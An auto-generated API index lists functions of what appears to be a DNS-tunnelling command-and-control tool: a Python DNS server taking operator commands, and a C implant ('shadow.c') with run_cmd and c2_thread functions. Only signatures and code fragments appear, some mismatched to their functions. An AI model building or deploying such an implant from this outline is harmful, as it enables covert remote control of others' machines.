# API

## server.py
- `encode_b64` (function) `server.py:17` `def encode_b64(data)`
- `decode_b64` (function) `server.py:20` `def decode_b64(data)`
- `decode_dns_name` (function) `server.py:27` `def decode_dns_name(data, pos)` -- Decodifica un nombre DNS (puede tener compresión)
- `build_dns_response` (function) `server.py:49` `def build_dns_response(query_data, answer_name, qtype, qclass, rdata_str, ttl)` -- Construye respuesta DNS con registro A o TXT
- `handle_query` (function) `server.py:77` `def handle_query(data, addr, sock)`
- `dns_server` (function) `server.py:147` `def dns_server()`
- `cmd_input` (function) `server.py:156` `def cmd_input()`

## shadow.c
- `encode_b64` (function) `shadow.c:29` `static void encode_b64(const unsigned char *in, size_t len, char *out)`
- `decode_b64` (function) `shadow.c:42` `static void decode_b64(const char *in, unsigned char *out, size_t *out_len)`
- `build_dns_query` (function) `shadow.c:68` `static int build_dns_query(uint16_t id, const char *name, int qtype, unsigned char *buf)` -- else if (c == '-') val = 62; else if (c == '_') val = 63; else continue; n = (n << 6) | val; bits += 6; if (bits >=...
- `dns_query` (function) `shadow.c:98` `static int dns_query(const char *name, int qtype, unsigned char *response, size_t *resp_len)` -- buf[pos++] = len; memcpy(buf + pos, p, len); pos += len; p = dot ? dot + 1 : p + strlen(p); } buf[pos++] = 0...
- `run_cmd` (function) `shadow.c:128` `static char *run_cmd(const char *cmd)` -- } struct timeval tv = {5, 0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); struct sockaddr_in from...
- `c2_thread` (function) `shadow.c:161` `static void *c2_thread(void *arg)` -- buf[n] = '\0'; output = realloc(output, total + n + 1); if (!output) { close(pipefd[0]); return strdup("realloc...
- `main` (function) `shadow.c:224` `int main(int argc, char **argv)`
